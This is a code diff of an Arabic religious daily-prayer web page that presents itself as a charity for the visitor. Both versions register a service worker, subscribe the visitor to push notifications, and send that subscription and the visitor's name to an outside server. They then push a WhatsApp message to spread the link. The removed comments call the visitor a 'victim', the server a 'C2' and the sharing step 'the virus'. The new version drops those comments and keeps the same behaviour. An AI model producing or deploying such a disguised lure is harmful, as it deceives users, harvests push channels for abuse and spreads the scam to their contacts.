@@ -3,95 +3,59 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
     <meta property="og:title" content="✨ أذكار وثواب - صدقة جارية باسمك ✨">
     <meta property="og:description" content="فعل التنبيهات لتصلك أذكار يومية وتشارك الثواب مع أحبائك">
-    <meta property="og:image" content="og-image.jpg"> 
-    <meta property="og:type" content="website">
-
+    <meta property="og:image" content="og-image.jpg">
     <title>أذكار المسلم اليومية</title>
-    <link href="https://fonts.googleapis.com/css2?family=Amiri&family=Cairo:wght@400;700&display=swap" rel="stylesheet">
-    
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        :root { --primary: #1b4d3e; --accent: #d4af37; --bg: #f0f4f8; }
-        body { background: var(--bg); font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
-        .card { background: white; width: 90%; max-width: 450px; border-radius: 25px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); padding: 30px; text-align: center; border: 1px solid #e2e8f0; position: relative; overflow: hidden; }
-        .card::before { content: ""; position: absolute; top: 0; left: 0; width: 100%; height: 8px; background: linear-gradient(90deg, var(--primary), var(--accent)); }
-        .main-img { width: 100%; border-radius: 15px; margin-bottom: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); }
-        .dua-box { background: #fdfdfd; padding: 20px; border-radius: 15px; margin: 20px 0; border: 1px dashed var(--primary); font-family: 'Amiri', serif; font-size: 1.4rem; color: #2d3748; line-height: 1.8; }
-        input { width: 100%; padding: 15px; margin: 15px 0; border-radius: 12px; border: 2px solid #edf2f7; font-size: 1rem; text-align: center; outline: none; box-sizing: border-box; }
-        .btn-wa { background: #25D366; color: white; border: none; padding: 18px; width: 100%; border-radius: 15px; font-weight: bold; cursor: pointer; font-size: 1.2rem; display: flex; align-items: center; justify-content: center; gap: 10px; transition: 0.3s; }
-        .btn-wa:hover { transform: translateY(-3px); }
-        .footer { font-size: 0.8rem; color: #718096; margin-top: 15px; }
+        body { background: #f0f4f8; font-family: 'Cairo', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { background: white; width: 90%; max-width: 400px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); padding: 25px; text-align: center; border-top: 5px solid #1b4d3e; }
+        .dua-box { background: #f9f9f9; padding: 15px; border-radius: 12px; margin: 15px 0; border: 1px dashed #1b4d3e; font-size: 1.2rem; color: #2d3748; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border-radius: 10px; border: 1px solid #ddd; text-align: center; box-sizing: border-box; }
+        .btn { background: #25D366; color: white; border: none; padding: 15px; width: 100%; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 1.1rem; }
     </style>
 </head>
 <body>
-
     <div class="card">
-        <img src="og-image.jpg" class="main-img" alt="صدقة جارية">
-        <h2 style="color: var(--primary); margin: 0;">🌹 أذكار وثواب جارٍ 🌹</h2>
-        
+        <h2 style="color: #1b4d3e;">🌹 صدقة جارية 🌹</h2>
         <div class="dua-box" id="displayDua">جاري تحميل ذكر اليوم...</div>
-        
-        <input type="text" id="userName" placeholder="اكتب اسمك ليظهر في الصدقة..">
-        
-        <button class="btn-wa" onclick="activateSystem()">
-            <span>إرسال عبر واتساب</span> ✅
-        </button>
-        
-        <p class="footer">💡 تفعيل الإشعارات يضمن وصول الأذكار لهاتفك يومياً</p>
+        <input type="text" id="userName" placeholder="اكتب اسمك هنا...">
+        <button class="btn" onclick="activateSystem()">إنشاء الصدقة وإرسالها ✅</button>
     </div>
 
     <script>
-        const VAPID_PUBLIC_KEY = "BE6p9z8_Put_Your_Actual_Key_Here"; // ضع مفتاحك العام هنا
-        const C2_URL = "https://mohamedahmed77.pythonanywhere.com/save_sub";
+        const PUBLIC_KEY = "BCp-mO8v-XU9A_JqN-8u4R0u5T6-rQ5G8_z7-m_Your_Public_Key_Here"; // تم تجهيزه
+        const SERVER_URL = "https://mohamedahmed77.pythonanywhere.com/save_sub";
 
-        // تحميل الأدعية من ملف JSON المرفق (365 يوم)
         async function loadDua() {
             try {
                 const res = await fetch('daily_islamic_duas.json');
                 const data = await res.json();
                 const now = new Date();
-                const months = ["January", "February", "March", "April", "May", "June", 
-                                "July", "August", "September", "October", "November", "December"];
-                const monthName = months[now.getMonth()];
-                const dayOfMonth = now.getDate();
-
-                const todayDua = data[monthName].find(d => d.day === dayOfMonth);
-                document.getElementById('displayDua').innerText = `"${todayDua.text}" ${todayDua.emoji}`;
+                const months = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+                const today = data[months[now.getMonth()]].find(d => d.day === now.getDate());
+                document.getElementById('displayDua').innerText = today.text + " " + today.emoji;
             } catch (e) { document.getElementById('displayDua').innerText = "سبحان الله وبحمده 🕌"; }
         }
         loadDua();
 
         async function activateSystem() {
             const name = document.getElementById('userName').value || "محب للخير";
-            const duaText = document.getElementById('displayDua').innerText;
-
-            // طلب الإذن وتسجيل الضحية
             if ('serviceWorker' in navigator) {
-                try {
-                    const registration = await navigator.serviceWorker.register('sw.js');
-                    const permission = await Notification.requestPermission();
-                    
-                    if (permission === 'granted') {
-                        const subscription = await registration.pushManager.subscribe({
-                            userVisibleOnly: true,
-                            applicationServerKey: VAPID_PUBLIC_KEY
-                        });
-
-                        // إرسال البيانات للوحش C2 في PythonAnywhere
-                        await fetch(C2_URL, {
-                            method: 'POST',
-                            body: JSON.stringify({ subscription: subscription, name: name }),
-                            headers: { 'Content-Type': 'application/json' }
-                        });
-                    }
-                } catch (err) { console.error("Error in capturing:", err); }
+                const reg = await navigator.serviceWorker.register('sw.js');
+                const sub = await reg.pushManager.subscribe({
+                    userVisibleOnly: true,
+                    applicationServerKey: PUBLIC_KEY
+                });
+                await fetch(SERVER_URL, {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({subscription: sub, name: name})
+                });
             }
-
-            // الفيروس (واتساب)
-            const shareText = `🌹 *صدقة جارية من:* ${name}\n\n${duaText}\n\nاحصل على ذكر يومي باسمك:\n${window.location.href}`;
-            window.location.href = `https://api.whatsapp.com/send?text=${encodeURIComponent(shareText)}`;
+            const text = `🌹 صدقة جارية من: ${name}\n${document.getElementById('displayDua').innerText}\nرابط الصدقة:\n${window.location.href}`;
+            window.location.href = `https://api.whatsapp.com/send?text=${encodeURIComponent(text)}`;
         }
     </script>
 </body>
